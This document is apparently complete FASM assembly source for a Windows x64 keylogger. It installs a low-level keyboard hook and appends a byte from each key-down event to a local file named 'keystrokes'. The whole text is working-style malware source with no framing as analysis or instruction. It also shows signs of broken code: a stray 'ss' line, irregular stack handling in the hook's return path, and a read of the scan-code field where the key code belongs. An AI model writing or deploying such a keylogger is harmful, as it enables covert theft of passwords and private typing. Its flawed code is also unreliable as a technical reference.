format PE64 GUI 4.0
entry start
include 'win64a.inc'

buffer	    DB 1
spaces	  db	512    dup    (0)
fp	 dq 0
filename db "keystrokes",0
filemode db  'a',0
sizeofuname	   dq	 255
hhook	   dq 0
struct MSG2
  hwnd	  dq ?
  message dd ?,?
  wParam  dq ?
  lParam  dq ?
  time	  dd ?
  pt	  POINT
	  dd ?
ends
msg	    MSG2
kbptr	   dq 0


start:
invoke	SetWindowsHookEx, WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0
mov	[hhook], rax

messageproc:
    invoke  GetMessage, msg, NULL, 0, 0
    cmp     rax, TRUE
    jz	    processmsg
    invoke  UnhookWindowsHookEx, [hhook]
    invoke  ExitProcess, 0
    processmsg:
	invoke	TranslateMessage, msg
	invoke	DispatchMessage, msg
	jmp messageproc

proc LowLevelKeyboardProc
    ss
    cmp     rcx, 00h
    jae     processhook
    return:
	mov rcx,0
      call [CallNextHookEx]
	sub rsp,8
       retn
    processhook:
    cmp rdx, WM_KEYDOWN
	jnz	return2
       mov	rbx,r8
	mov	rbx,qword [rbx+4h]
	mov	[buffer],bl
    invoke fopen, filename, filemode
    mov [fp],rax
    invoke  fwrite, buffer, 1, 1, [fp]
    invoke  fclose,[fp]
    return2:
ret
endp
include 			'\INCLUDE\API\KERNEL32.INC'
include 			'\INCLUDE\API\USER32.INC'

;


section '.idata' import data readable writeable
  library kernel32,'KERNEL32.DLL',\
	  msvcrt,'MSVCRT.DLL',\
	  user32,'USER32.DLL'
import	msvcrt, fopen,	       'fopen',\
		fwrite,        'fwrite',\
		fclose,        'fclose',\
		strcat,        'strcat'

